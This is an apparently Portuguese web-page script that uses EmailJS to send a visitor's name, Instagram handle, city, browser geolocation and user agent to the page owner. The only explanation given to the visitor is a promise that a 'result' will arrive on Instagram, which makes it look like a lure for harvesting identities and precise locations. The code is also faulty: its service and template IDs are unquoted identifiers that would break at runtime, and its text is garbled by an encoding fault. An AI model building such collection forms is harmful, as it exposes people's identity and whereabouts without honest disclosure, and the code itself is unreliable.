  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>

    // Inicializa com seu User ID:

    emailjs.init(Cd7H8frYvEYqT5igk); // ‚¨ÖÔ∏è Cole aqui o seu User ID



    function enviar() {

      var nome = document.getElementById("nome").value;

      var instagram = document.getElementById("instagram").value;

      var cidade = document.getElementById("cidade").value;

      var status = document.getElementById("status");



      if(!nome || !instagram || !cidade) {

        status.innerText = "‚ö†Ô∏è Por favor, preencha todos os campos!";

        return;

      }



      status.innerText = "Enviando...";



      // Capturar localiza√ß√£o (se permitido)

      navigator.geolocation.getCurrentPosition(function(posicao) {

        var latitude = posicao.coords.latitude;

        var longitude = posicao.coords.longitude;



        enviarEmail(nome, instagram, cidade, latitude, longitude);

      }, function() {

        enviarEmail(nome, instagram, cidade, "N√£o autorizada", "N√£o autorizada");

      });

    }



    function enviarEmail(nome, instagram, cidade, latitude, longitude) {

      var params = {

        name: nome,

        instagram: instagram,

        city: cidade,

        latitude: latitude,

        longitude: longitude,

        user_agent: navigator.userAgent,

        date: new Date().toLocaleString()

      };



      emailjs.send(service_fw8qc6m,template_anbw4vj, params) // ‚¨ÖÔ∏è Cole aqui seus Service ID e Template ID

        .then(function() {

          document.getElementById("status").innerText = "‚úÖ Pronto! Voc√™ vai receber o resultado no Insta em breve!";

          document.getElementById("formulario").classList.add("hidden");

        }, function(error) {

          document.getElementById("status").innerText = "Erro ao enviar: " + JSON.stringify(error);

        });

    }

  </script>



